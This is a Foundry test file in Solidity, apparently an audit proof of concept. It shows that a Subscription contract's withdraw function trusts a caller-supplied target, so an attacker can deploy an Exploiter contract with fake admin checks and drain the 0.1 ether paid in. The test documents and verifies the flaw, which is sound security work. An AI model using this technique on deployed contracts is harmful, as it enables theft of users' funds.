// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.19 <0.9.0;

import { Test } from "forge-std/Test.sol";

import { IAccessControl } from "@openzeppelin/contracts/access/IAccessControl.sol";
import { IPaymentSystem } from "contracts/interfaces/IPaymentSystem.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
import { MockMinter } from "contracts/mocks/MockMinter.sol";
import { MockNFT } from "contracts/mocks/MockNFT.sol";
import { Subscription } from "contracts/Subscription.sol";

import { Exploiter } from "./test/Exploiter.sol";

// solhint-disable-next-line
import { console2 } from "forge-std/console2.sol";

error SubscriptionExpired();

contract ExploitTest is Test {
    bytes32 public immutable MINTER_ROLE = keccak256("MINTER");

    address payable internal user = payable(address(0x12345));
    address payable internal hacker = payable(address(0x678));

    MockMinter internal mockMinter;
    MockNFT internal mockNFT;
    Subscription internal subscription;

    Exploiter internal exploiterContract;

    function setUp() public virtual {
        vm.label(user, "User");
        vm.deal(user, 10 ether);

        vm.label(hacker, "Hacker");
        vm.deal(hacker, 10 ether);

        vm.startPrank(user);

        mockNFT = new MockNFT({
            _enableSubscription: true,
            _initialOwner: user
        });

        subscription = new Subscription({
            cre8orsNFT_: address(mockNFT),
            minRenewalDuration_: 1 days,
            pricePerSecond_: 38580246913 // Roughly calculates to 0.1 ether per 30 days
        });

        mockNFT.setSubscription(address(subscription));

        mockMinter = new MockMinter({_mockNFT: address(mockNFT), _subscription: address(subscription)});

        IAccessControl(mockNFT).grantRole(MINTER_ROLE, address(mockMinter));

        Ownable(address(mockNFT)).transferOwnership(address(mockMinter));
    }

    // Exploit Scenario:
    // deploy MockNFT
    // deploy Subscription
    // set subscription in MockNFT
    // deploy MockMinter
    // set minter role
    // transfer ownership of MockNFT to MockMinter
    // user mints by calling mint in MockMinter
    // 0.1 ether is in subscription contract
    // anyone can withdraw:
    //   hacker creates a similar MockNFT contract just with isAdmin functionality
    //   passes that contract address in target to withdraw function and gets 0.1 ether

    function test_ExploitWithdraw() external {
        uint256 tokenId = 1;
        address owner;

        vm.warp(block.timestamp + 1 days);

        // mint nft for user(user)
        mockMinter.mint{ value: 0.1 ether }(address(mockNFT), user, tokenId);

        // ownerOf returns correct user
        owner = mockNFT.ownerOf(tokenId);
        assertEq(owner, user);

        assertEq(address(subscription).balance, 0.1 ether);

        vm.stopPrank();

        vm.startPrank(hacker);

        // hacker creates a similar MockNFT contract just with isAdmin functionality
        exploiterContract = new Exploiter({admin_: hacker});

        // passes that contract address in target to withdraw function and gets 0.1 ether
        IPaymentSystem(address(subscription)).withdraw({ target: address(exploiterContract), to: payable(hacker) });

        assertEq(address(subscription).balance, 0);
        assertEq(address(hacker).balance, 10 ether + 0.1 ether);

        vm.stopPrank();
    }
}
